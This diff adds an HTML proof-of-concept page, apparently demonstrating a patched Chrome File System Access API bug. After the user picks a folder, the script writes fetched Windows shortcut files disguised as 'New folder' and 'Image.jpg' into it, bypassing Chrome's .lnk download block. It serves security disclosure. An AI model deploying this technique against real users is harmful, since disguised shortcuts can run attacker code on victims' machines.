@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>File System Access API - security bugs</title>
+</head>
+
+<body>
+    <h3>File System Access API - security bugs</h3>
+
+    <div style="display: flex; flex-direction: row">
+
+        <div style="width: 50%">
+            <div>
+                <button id="butDirectory">Select a folder where to create a new folder and image.jpg</button>
+            </div>
+            <textarea id="fileContentTextArea" style="width: 100%; min-height: 300px"></textarea>
+        </div>
+
+    </div>
+    <script>
+        let fileHandle;
+        const butDir = document.getElementById('butDirectory')
+
+        // Save .lnk file to selected folder
+        // Google chrome is blocking .lnk files in default download method source: https://source.chromium.org/chromium/chromium/src/+/master:net/base/filename_util_internal.cc;drc=1c58af32060fa0ef3cfd4037fdc7913092d16ba2;l=155?q=%20EnsureSafeExtension&ss=chromium
+        // before patch: You can save .lnk file to selected folder
+        // after patch: You cannot save .lnk file to selected folder        
+
+        butDir.addEventListener('click', async () => {
+            //get a user system folder
+            const dirHandle = await window.showDirectoryPicker()
+
+            //create New Folder shortcut file in a user system folder
+            const newFileHandle = await dirHandle.getFileHandle('New folder.lnk', {
+                create: true
+            })
+
+            //write real lnk code to the file that we created
+            const writable = await newFileHandle.createWritable()
+            const response = await fetch('folder.lnk')
+            await response.body.pipeTo(writable)
+
+            //create image.jpg shortcut file in a user system folder
+            const newFileHandleImage = await dirHandle.getFileHandle('Image.jpg.lnk', {
+                create: true
+            })
+
+            //write real lnk code to the file that we created
+            const writableForImage = await newFileHandleImage.createWritable()
+            const responseForImage = await fetch('lnkextra.lnk')
+            await responseForImage.body.pipeTo(writableForImage)
+        })
+    </script>
+</body>
+
+</html>
